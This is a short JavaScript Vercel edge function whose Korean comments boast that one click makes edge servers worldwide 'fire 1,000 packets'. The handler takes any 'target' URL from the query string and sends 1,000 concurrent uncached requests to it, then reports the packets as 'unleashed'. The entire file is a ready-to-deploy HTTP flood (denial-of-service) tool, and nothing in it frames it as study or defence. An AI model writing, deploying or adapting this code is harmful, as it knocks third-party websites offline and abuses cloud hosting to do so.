// Vercel 초고속 에지 서버 설정
export const config = { runtime: 'edge' };

export default async function handler(req) {
  const { searchParams } = new URL(req.url);
  const target = searchParams.get('target');

  if (!target) return new Response("TARGET_MISSING", { status: 400 });

  // 한 번 클릭에 전 세계 에지 서버가 1,000발의 패킷을 동시 발사
  const attack = Array.from({ length: 1000 }).map(() =>
    fetch(target, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {})
  );

  await Promise.all(attack);

  return new Response(`[SUCCESS] 1,000 PACKETS UNLEASHED ON ${target}`, {
    headers: { 'content-type': 'text/plain; charset=utf-8' }
  });
}
